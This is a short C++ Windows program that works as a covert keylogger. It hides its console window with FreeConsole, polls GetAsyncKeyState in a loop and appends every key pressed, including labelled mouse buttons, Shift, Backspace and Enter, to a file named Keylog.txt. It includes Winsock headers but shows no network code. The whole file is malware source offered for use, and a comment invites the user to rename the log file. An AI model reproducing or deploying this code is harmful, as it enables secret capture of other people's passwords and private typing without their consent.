#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")

#include <iostream>
#include <Windows.h>
#include <winsock2.h>

using namespace std;

int Save(int key, char *file);



int main() {

    FreeConsole();

    char i;
    while(true) {

        Sleep(20);
        
        for(i=8; i<=225; i++){

            if(GetAsyncKeyState(i) == -32767) {                
                Save(i, "Keylog.txt"); //change the file name as per your choices

            }   //this cindition will capture only the keys which are presssed
        }
        



    }
    return 0;
}
int Save(int key, char *file) {

    cout << key <<endl;

    Sleep(20);

    FILE *OUTPUT_FILE; 

    OUTPUT_FILE = fopen(file, "a+");
    if(key == VK_LBUTTON){
        fprintf(OUTPUT_FILE, "%s", "[LEFT MOUSE BUTTON]");
    }
    else if(key == VK_RBUTTON){
        fprintf(OUTPUT_FILE, "%s", "[RIGHT MOUSE BUTTON]");
    }
    else if(key == VK_SHIFT){
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    }
    else if(key == VK_BACK){
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    }
    else if(key == VK_CAPITAL){
        fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK KEY]");
    }
    else if(key == VK_RETURN){
        fprintf(OUTPUT_FILE, "%s", "[ENTER]");
    }
    else
        fprintf(OUTPUT_FILE, "%s", &key);
    fclose(OUTPUT_FILE); 

    return 0;
}
